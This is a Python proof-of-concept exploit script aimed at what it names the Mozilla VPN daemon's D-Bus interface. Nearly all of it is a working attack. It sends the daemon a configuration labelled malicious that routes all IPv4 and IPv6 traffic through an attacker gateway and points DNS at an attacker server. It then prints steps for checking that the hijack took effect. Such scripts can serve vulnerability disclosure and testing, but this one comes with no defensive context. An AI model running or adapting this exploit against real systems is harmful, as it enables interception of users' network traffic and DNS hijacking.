import sys
import json
import pydbus

def exploit():
    try:
        bus = pydbus.SystemBus()
        vpn = bus.get("org.mozilla.vpn.dbus", "/org/mozilla/vpn/dbus")
    except Exception as e:
        print(f"[-] Failed to connect to DBus: {e}")
        return

    # Malicious configuration
    # Routes all traffic (0.0.0.0/0) to the attacker's gateway (10.66.66.1)
    # Sets DNS to attacker's DNS (1.2.3.4)
    malicious_config = {
        "hopType": "SingleHop",
        "privateKey": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", # Valid base64 key format
        "deviceIpv4Address": "10.66.66.2/32",
        "deviceIpv6Address": "fc00:bbbb:bbbb:bb01::2/128",
        "serverIpv4Gateway": "10.66.66.1",
        "serverIpv6Gateway": "fc00:bbbb:bbbb:bb01::1",
        "serverIpv4AddrIn": "192.168.1.100", # Attacker's public IP
        "serverIpv6AddrIn": "::1",
        "serverPublicKey": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=",
        "serverPort": 51820,
        "dnsServer": "1.2.3.4", # Attacker's DNS server
        "allowedIPAddressRanges": [
            {"address": "0.0.0.0", "range": 0, "isIpv6": False},
            {"address": "::", "range": 0, "isIpv6": True}
        ]
    }

    print("[*] Sending malicious configuration to Mozilla VPN Daemon...")
    try:
        # The activate method takes a JSON string
        vpn.activate(json.dumps(malicious_config))
        print("[+] Exploit sent successfully!")
        print("[+] Check 'ip route' and '/etc/resolv.conf' (or resolvectl status) to verify hijacking.")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    exploit()
